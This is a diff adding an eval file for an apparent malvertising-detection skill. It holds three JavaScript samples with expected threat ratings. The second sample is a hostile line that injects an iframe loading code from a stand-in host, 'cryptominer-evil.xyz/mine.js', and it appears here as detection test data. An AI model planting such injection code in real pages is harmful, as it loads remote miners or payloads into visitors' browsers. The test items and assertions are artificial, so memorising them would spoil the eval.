@@ -1,0 +1,37 @@
+{
+  "skill_name": "Malvertising-Pattern-Detector",
+  "evals": [
+    {
+      "id": 1,
+      "prompt": "Analyze JS: \"googletag.cmd.push(function(){googletag.display('div-gpt-ad-1');});\"",
+      "expected_output": "see assertions",
+      "files": [],
+      "assertions": [
+        "threat_level == Safe",
+        "detected_patterns == []",
+        "unauthorized_domains_found == []"
+      ]
+    },
+    {
+      "id": 2,
+      "prompt": "Analyze JS: \"var i=document.createElement('iframe');i.src='http://cryptominer-evil.xyz/mine.js';document.body.appendChild(i);\"",
+      "expected_output": "see assertions",
+      "files": [],
+      "assertions": [
+        "threat_level == Malicious",
+        "detected_patterns contains iframe OR hidden iframe",
+        "unauthorized_domains_found contains cryptominer-evil.xyz"
+      ]
+    },
+    {
+      "id": 3,
+      "prompt": "Analyze JS: \"var img=new Image();img.src='data:image/png;base64,iVBORw0KGgo=';\"",
+      "expected_output": "see assertions",
+      "files": [],
+      "assertions": [
+        "threat_level == Safe OR threat_level == Suspicious",
+        "detected_patterns contains base64"
+      ]
+    }
+  ]
+}
